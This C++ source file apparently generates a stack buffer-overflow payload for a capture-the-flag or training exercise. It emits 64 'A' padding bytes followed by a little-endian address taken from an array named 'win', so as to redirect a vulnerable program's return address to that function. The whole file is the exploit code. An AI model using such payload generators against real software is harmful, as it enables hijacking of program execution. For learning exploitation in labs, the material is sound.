#include <iostream>
#include <string>

int main(int argc, char const *argv[])
{
    std::string payload;
    int i, j;
    char win[4]{ '\x08','\x04','\x91','\xa6' };
    for (j = 0; j < 64; j++) payload.push_back('\x41');
    i = 4;
    do
    {
        i--;
        payload.push_back(win[i]);
    } while (i > 0);
    std::cout << payload;
    
    return 0;
}
